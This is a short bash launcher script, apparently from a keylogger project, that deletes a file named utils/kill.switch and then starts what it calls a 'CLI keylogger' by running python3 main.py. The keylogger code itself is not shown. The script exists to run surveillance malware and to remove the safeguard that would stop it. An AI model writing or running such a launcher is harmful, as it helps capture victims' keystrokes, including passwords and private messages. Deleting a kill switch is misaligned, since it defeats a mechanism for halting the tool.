#!/bin/bash

echo "[*] Removing kill switch (if exists)..."
rm -f utils/kill.switch

echo "[*] Starting CLI keylogger..."
python3 main.py
